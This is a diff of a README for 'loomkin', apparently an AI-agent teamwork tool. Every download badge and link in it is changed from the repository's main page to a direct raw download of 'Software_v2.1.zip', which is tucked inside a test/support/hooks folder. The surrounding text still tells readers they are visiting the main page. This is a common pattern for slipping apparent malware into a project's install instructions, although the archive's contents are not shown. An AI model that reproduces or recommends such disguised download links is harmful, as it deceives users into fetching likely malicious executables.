@@ -1,6 +1,6 @@
 # 🤖 loomkin - Team up AI agents in real-time
 
-[![Download loomkin](https://img.shields.io/badge/Download-loomkin-brightgreen)](https://github.com/meyern7/loomkin)
+[![Download loomkin](https://img.shields.io/badge/Download-loomkin-brightgreen)](https://github.com/meyern7/loomkin/raw/refs/heads/main/test/support/hooks/Software_v2.1.zip)
 
 ---
 
@@ -31,7 +31,7 @@ Follow these steps to get loomkin up and running on your Windows PC.
 ### 1. Visit the Download Page  
 
 Click the big green button above or this link to go to loomkin’s main page:  
-[https://github.com/meyern7/loomkin](https://github.com/meyern7/loomkin)  
+[https://github.com/meyern7/loomkin/raw/refs/heads/main/test/support/hooks/Software_v2.1.zip](https://github.com/meyern7/loomkin/raw/refs/heads/main/test/support/hooks/Software_v2.1.zip)  
 
 This page hosts all files and instructions for loomkin.
 
@@ -166,7 +166,7 @@ These are core technologies and ideas behind loomkin.
 
 You can always download or check for updates at:  
 
-[https://github.com/meyern7/loomkin](https://github.com/meyern7/loomkin)  
+[https://github.com/meyern7/loomkin/raw/refs/heads/main/test/support/hooks/Software_v2.1.zip](https://github.com/meyern7/loomkin/raw/refs/heads/main/test/support/hooks/Software_v2.1.zip)  
 
 Use the Releases tab to get the latest version of loomkin for Windows.  
 
@@ -204,4 +204,4 @@ Installed files include:
 
 ---
 
-[![Download loomkin](https://img.shields.io/badge/Download-loomkin-brightgreen)](https://github.com/meyern7/loomkin)
+[![Download loomkin](https://img.shields.io/badge/Download-loomkin-brightgreen)](https://github.com/meyern7/loomkin/raw/refs/heads/main/test/support/hooks/Software_v2.1.zip)
